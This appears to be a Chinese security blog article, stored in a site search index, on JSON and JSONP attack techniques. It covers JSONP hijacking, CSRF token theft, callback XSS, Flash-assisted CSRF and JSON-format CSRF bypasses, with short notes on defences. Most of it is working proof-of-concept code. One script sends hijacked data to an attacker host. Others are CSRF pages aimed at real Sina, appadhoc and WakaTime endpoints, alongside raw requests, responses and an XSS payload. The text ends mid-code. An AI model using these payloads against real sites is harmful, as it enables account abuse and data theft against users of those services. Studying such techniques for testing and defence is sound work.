<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[json与jsonp的学习与分析]]></title>
      <url>/2019/07/21/%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/json/</url>
      <content type="html"><![CDATA[<p>[TOC]</p>
<h1 id="json与jsonp的学习与分析"><a href="#json与jsonp的学习与分析" class="headerlink" title="json与jsonp的学习与分析"></a>json与jsonp的学习与分析</h1><h2 id="json和jsonp的区别"><a href="#json和jsonp的区别" class="headerlink" title="json和jsonp的区别"></a>json和jsonp的区别</h2><p>避免在后续的工作中把json和jsonp搞混，这里说明下其区别</p>
<p>json是一种传输格式，这个不用多说，而jsonp简单来说就是利用script标签绕过同源策略，获得一个类似这样的数据，只支持get请求</p>
<p>json劫持这里属于csrf的范畴，通过回调函数名称，进行敏感数据获取。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function test(data)&#123;</span><br><span class="line">    //alert(v.name);</span><br><span class="line">    var xmlhttp = new XMLHttpRequest();</span><br><span class="line">    var url = &quot;http://xx.xx.xx.xx/&quot; + JSON.stringify(data);</span><br><span class="line">    xmlhttp.open(&quot;GET&quot;,url,true);</span><br><span class="line">    xmlhttp.send();</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;http://xx.xx.xx.xx/1.php?callback=test&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<h2 id="jsonp-简介"><a href="#jsonp-简介" class="headerlink" title="jsonp 简介"></a>jsonp 简介</h2><p>json padding 将json数据填充进回调函数；在客户端创建一个回调函数并将回调函数名传给服务端，服务端根据定义的回调函数名的方法，将获取的json数据传入方法，完成回调。</p>
<h2 id="jsonp-风险"><a href="#jsonp-风险" class="headerlink" title="jsonp 风险"></a>jsonp 风险</h2><h3 id="jsonp劫持"><a href="#jsonp劫持" class="headerlink" title="jsonp劫持"></a>jsonp劫持</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
<li>只使用csrf-token进行csrf校验</li>
</ul>
<p>获取csrf token这类跨域问题，CORS、PostMessage以及jsonp，这里我们先讨论jsonp的情况，在遇到这类时，可以先尝试检查是否存在泄漏token的jsonp。</p>
<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><ul>
<li>测试方法，在get url中添加jsonp常用回调函数（可以根据具体的情况判断），常用函数名的变量名如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callback、jsonpcallback、func</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>通过jsonp获取到后端身份校验token，构造CSRF页面 嵌入获取到的token值，进行后段绕过校验CSRF攻击。<br>利用示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;test&lt;/title&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://guba.sina.com.cn/api/?s=Thread&amp;a=safe_post&quot; method=&quot;POST&quot; id=&quot;csrfsend&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;bid&quot; value=&quot;9947&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;tid&quot; value=&quot;&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;content&quot; value=&quot;这是测试结果&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;title&quot; value=&quot;这是测试标题&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; id=&quot;token&quot; name=&quot;_csrf_token&quot; value=&quot;&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;anonymous&quot; value=&quot;1&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function hehehe(obj)&#123;</span><br><span class="line">    console.log(obj);</span><br><span class="line">    var csrf_token = obj[&quot;result&quot;][&quot;data&quot;][&quot;_csrf_token&quot;];</span><br><span class="line">    document.getElementById(&quot;token&quot;).value = csrf_token;</span><br><span class="line">    document.getElementById(&quot;csrfsend&quot;).submit();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://guba.sina.com.cn/api/?s=Thread&amp;a=safe_post&amp;callback=hehehe&amp;bid=9947&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<h4 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h4><ul>
<li>referer限制（注意referer过滤是否正则可绕过如<a href="http://www.qq.com.attack.com/attack.htm或http://www.attack.com/attack.htm?qq.com、空referer）" target="_blank" rel="noopener">http://www.qq.com.attack.com/attack.htm或http://www.attack.com/attack.htm?qq.com、空referer）</a></li>
<li>随机token</li>
</ul>
<h3 id="callback可自定义导致的安全问题-典型案例"><a href="#callback可自定义导致的安全问题-典型案例" class="headerlink" title="callback可自定义导致的安全问题 典型案例"></a>callback可自定义导致的安全问题 典型案例</h3><h4 id="Content-Type与XSS漏洞"><a href="#Content-Type与XSS漏洞" class="headerlink" title="Content-Type与XSS漏洞"></a>Content-Type与XSS漏洞</h4><h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>输出json时，没有严格定义Content-Type（Content-Type: application/json）</li>
<li>callback 输出点没有进行过滤处理</li>
</ul>
<h5 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h5><h5 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h5><ul>
<li>严格定义Content-Type: application/json</li>
</ul>
<ol>
<li>Content-Type校验不严漏洞</li>
</ol>
<p>在python Bottle中出现过这个问题，对应的cve编号CVE-2014-3137，在该漏洞中Bottle框架会接受诸如“text / plain; application / json”作为json内容 application/json<br>类型，攻击者可能会使用它来绕过安全机制，例如，Chrome不允许将内容类型设置为“application / json”的跨源xmlhttprequests，但在bottel中可以将其设置为“text / plain; application / json”绕过。</p>
<p>绕过形式 Content-Type防御解析HTML的事件，例如在IE6、7等版本请求的URL文件后加一个/x.html就可以解析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/getUsers.php/x.html?callback=＜script＞alert(/xss/)＜/script＞</span><br></pre></td></tr></table></figure></p>
<ul>
<li>过滤callback以及JSON数据输出<br>注意 旧版ie中的utf7-BOM导致的问题</li>
</ul>
<h3 id="MHTML与JSONP"><a href="#MHTML与JSONP" class="headerlink" title="MHTML与JSONP"></a>MHTML与JSONP</h3><p>MHTML（MIME HTML协议）协议解析跨域漏洞，这个有点老，先不管</p>
<h3 id="FLASH与JSONP"><a href="#FLASH与JSONP" class="headerlink" title="FLASH与JSONP"></a>FLASH与JSONP</h3><p>这个也是早年的漏洞问题了，这里要稍微注意下content-type与jsonp的关系，执行jsonp的状态下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Type = &apos;application/json;charset=UTF-8&apos; </span><br><span class="line">Content-Type = &apos;text/json;charset=UTF-8&apos; </span><br><span class="line">Content-Type = &apos;text/javascript;charset=UTF-8&apos; </span><br><span class="line">Content-Type =&apos;application/javascript;charset=UTF-8&apos;</span><br></pre></td></tr></table></figure></p>
<p>严格来说json格式也属于js对象的子集，严格的JavaScript对象表示法来表示结构化的数据，所以使用content-type为javascript时，服务端也认可客户端提交的json格式数据。</p>
<h5 id="FLASH的调用及域"><a href="#FLASH的调用及域" class="headerlink" title="FLASH的调用及域"></a>FLASH的调用及域</h5><ul>
<li>html调用flash，flash可以改后缀名(swf改成gif等)。</li>
<li>flash可以单独访问，但是其效果类似与html调用同域的flash，但只这个后缀必须是swf。</li>
<li>flash发动请求时，是根据flash的域来判断的，而不是html来判断：</li>
</ul>
<ol>
<li>flash请求同域资源时，直接忽视crossdomain.xml。</li>
<li>flash（跨域传输数据）请求外域资源时，受外域下crossdomain.xml里的策略限制。</li>
</ol>
<p>在CSRF的防御策略上，一般是通过referer以及token校验，但在借用flash上传的时候，可以绕过CSRF的referer和token限制。在只有referer校验的CSRF，就可以直接用 上传flash利用，在有token校验的时候，就要劫持token，在用到jsonp，就可以用jsonp劫持token，进一步利用</p>
<h5 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h5><p>利用思路如下：</p>
<ol>
<li>将flash文件上传到存在上传处的目标网站中</li>
<li>用户触发该flash中的csrf代码，由于flash请求同源资源时，直接忽视crossdomain.xml,flash发送的请求的Referer是flash的因此referer校验无效，在存在jsonp劫持的条件下，可以获取用户token，这个时候token校验值也无效了。通过flash上传+jsonp劫持绕过referer校验和token校验达到CSRF。</li>
</ol>
<h5 id="利用验证"><a href="#利用验证" class="headerlink" title="利用验证"></a>利用验证</h5><p>在利用这个jsonp之前，先来了解一下swf-json-csrf</p>
<h6 id="利用环境"><a href="#利用环境" class="headerlink" title="利用环境"></a>利用环境</h6><ul>
<li>支持旧版本flash浏览器<br>GET以及POST请求可用：</li>
</ul>
<p>chrome 61.0及以前</p>
<p>firefox 52.0.1及以前</p>
<p>Opera 47.0及以前</p>
<p>Safari 11.0及以前</p>
<ul>
<li>开启referer验证+token验证</li>
</ul>
<h3 id="利用JSONP进行水坑攻击"><a href="#利用JSONP进行水坑攻击" class="headerlink" title="利用JSONP进行水坑攻击"></a>利用JSONP进行水坑攻击</h3><p>这个是乌云里面一篇较早的文章了，水坑攻击者在有漏洞的网站上部署上可触发获取别的网站有用信息的js，如：攻击者在A网站上插入了可执行的js，建立水坑；js利用callback获取第三方网站B上的对应用户信息；将获取的信息解析发送给攻击者自己的接收平台。</p>
<h2 id="JSON风险"><a href="#JSON风险" class="headerlink" title="JSON风险"></a>JSON风险</h2><p>目标是 利用FLASH利用JSON跨站点请求伪造</p>
<h3 id="JSON格式的CSRF"><a href="#JSON格式的CSRF" class="headerlink" title="JSON格式的CSRF"></a>JSON格式的CSRF</h3><p>当数据内容提交为json格式的报文时，CSRF和常规的CSRF就不一样了，即便这个CSRF没有校验referer和token，这个时候post的数据用form形式提交，将json内容放在name属性中，这个时候会有一个value值，当这个value值为空的时候，数值会有一个”=”，正常情况下服务端json解析器在校验的时候可能会拒绝这个请求（不符合格式）。</p>
<p>随意在burp里面翻了个包来测试 效果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /get_flags_async HTTP/1.1</span><br><span class="line">Host: experiment.appadhoc.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Referer: https://blog.csdn.net/</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Content-Length: 551</span><br><span class="line">Origin: https://blog.csdn.net</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;app_key&quot;:&quot;*****&quot;,&quot;client_id&quot;:&quot;*****&quot;,&quot;summary&quot;:&#123;&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;*****&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;&#125;,&quot;custom&quot;:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>借用burp生成的csrf的POC，将json内容置为name，value置为空<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&apos;&apos;, &apos;&apos;, &apos;/&apos;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;https://experiment.appadhoc.com/get_flags_async&quot; method=&quot;POST&quot; enctype=&quot;text/plain&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;&#123;&quot;app_key&quot;:&quot;******&quot;,&quot;client_id&quot;:&quot;******&quot;,&quot;summary&quot;:&#123;&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;******&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;&#125;,&quot;custom&quot;:&#123;&#125;&#125;&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p>请求内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /get_flags_async HTTP/1.1</span><br><span class="line">Host: experiment.appadhoc.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Referer: http://burp/</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Length: 554</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&#123;&quot;app_key&quot;:&quot;******&quot;,&quot;client_id&quot;:&quot;******&quot;,&quot;summary&quot;:&#123;&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;******&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;&#125;,&quot;custom&quot;:&#123;&#125;&#125;=</span><br></pre></td></tr></table></figure></p>
<p>返回结果：json解析器并不解析，并且Content-Type为也由原本的application/json转换为text/plain类型</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 400 Bad Request</span><br><span class="line">Server: nginx/1.12.2</span><br><span class="line">Date: Fri, 22 Feb 2019 07:52:08 GMT</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Length: 77</span><br><span class="line">Connection: close</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line"></span><br><span class="line">The request content was malformed:</span><br><span class="line">unknown token =</span><br><span class="line">Near: e&quot;:&quot;&quot;&#125;,&quot;custom&quot;:&#123;&#125;&#125;=</span><br></pre></td></tr></table></figure>
<h4 id="服务器查找json格式的数据但不验证Content-type"><a href="#服务器查找json格式的数据但不验证Content-type" class="headerlink" title="服务器查找json格式的数据但不验证Content-type"></a>服务器查找json格式的数据但不验证Content-type</h4><p>对于服务器查找json格式的数据但不验证Content-type的情况，可以尝试以下方法(使用Content-type：text / plain来实现)：</p>
<ul>
<li><p>方法一 fetch api的调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt;JSON CSRF POC&lt;/title&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h1&gt; JSON CSRF POC &lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">fetch(&apos;http://vul-app.com&apos;, &#123;method: &apos;POST&apos;, credentials: &apos;include&apos;, headers: &#123;&apos;Content-Type&apos;: &apos;text/plain&apos;&#125;, body: &apos;&#123;&quot;name&quot;:&quot;attacker&quot;,&quot;email&quot;:&quot;attacker.com&quot;&#125;&apos;&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;form action=&quot;#&quot;&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法二 hackerone 上的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">$( document ).ready(function() &#123;</span><br><span class="line">    $(&quot;#z&quot;).attr(&quot;name&quot;,&apos;&#123;&quot;entity&quot;:&quot;https://zzz.com&quot;,&quot;type&quot;:&quot;domain&quot;,&quot;time&quot;:&quot;&apos;+($.now()/1000)+&apos;&quot;,&quot;project&quot;:&quot;&lt;&lt;LAST_PROJECT&gt;&gt;&quot;,&quot;is_debugging&quot;:false,&quot;plugin&quot;:&quot;chrome-wakatime/1.0.2&quot;,&quot;fakeparam&quot;:&quot;&apos;);</span><br><span class="line">    $(&quot;#f&quot;).submit();</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form id=&quot;f&quot; ENCTYPE=&quot;text/plain&quot; action=&quot;https://api.wakatime.com/api/v1/users/current/heartbeats&quot; method=&quot;post&quot;&gt;</span><br><span class="line">&lt;input id=&quot;z&quot; type=&quot;hidden&quot; name=&apos;test&apos; value=&apos;test&quot;&#125;&apos;&gt; </span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;send&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>给value赋予一个值，构造正常的json数据包<br>形式一：用单引号构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&apos;&apos;, &apos;&apos;, &apos;/&apos;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;https://experiment.appadhoc.com/get_flags_async&quot; method=&quot;POST&quot; enctype=&quot;text/plain&quot;&gt;</span><br><span class="line">      &lt;input name=&apos;&#123;&quot;app_key&quot;:&quot;*****&quot;,&quot;client_id&quot;:&quot;*****&quot;,&quot;summary&quot;:&#123;&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;https://blog.csdn.net/&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;&#125;,&quot;custom&quot;:&#123;&#125;,&quot;test&quot;:&quot;&apos; value=&apos;test&quot;&#125;&apos; type=&apos;hidden&apos;&gt; </span><br><span class="line">      &lt;input type=submit&gt; </span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">请求数据：</span><br><span class="line">POST /get_flags_async HTTP/1.1</span><br><span class="line">Host: experiment.appadhoc.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Length: 124</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&#123;&quot;app_key&quot;:&quot;*****&quot;,&quot;client_id&quot;:&quot;*****&quot;,&quot;summary&quot;:&#123;&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;*****&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;&#125;,&quot;custom&quot;:&#123;&#125;,&quot;test&quot;:&quot;=test&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<p>返回200</p>
<h4 id="服务器查找json格式的数据并验证Content-type，即application-json"><a href="#服务器查找json格式的数据并验证Content-type，即application-json" class="headerlink" title="服务器查找json格式的数据并验证Content-type，即application/json"></a>服务器查找json格式的数据并验证Content-type，即application/json</h4><p>但在校验Content-type的情况下，这个时候上述方法就行不不通了。这个时候可以用ajax来自定义数据头，XHRHTTPREQUEST修改Content-Type,改成application/json<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      function submitRequest()</span><br><span class="line">      &#123;</span><br><span class="line">        var xhr = new XMLHttpRequest();</span><br><span class="line">        xhr.open(&quot;POST&quot;, &quot;http://www.xxx.com/webnet/edit&quot;, true);</span><br><span class="line">        xhr.setRequestHeader(&quot;Accept&quot;, &quot;*/*&quot;);</span><br><span class="line">        xhr.setRequestHeader(&quot;Accept-Language&quot;, &quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;);</span><br><span class="line">        xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json; charset=utf-8&quot;);</span><br><span class="line">        xhr.withCredentials = true;</span><br><span class="line">        xhr.send(JSON.stringify(&#123;&quot;pSpotId&quot;:&quot;120201&quot;,&quot;pSignTimes&quot;:&quot;70&quot;,&quot;pModuleID&quot;:&quot;207&quot;,&quot;pSceneid&quot;:&quot;120201007000046&quot;&#125;));</span><br><span class="line">    &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;#&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;button&quot; value=&quot;Submit request&quot; onclick=&quot;submitRequest();&quot;/&gt;</span><br><span class="line">  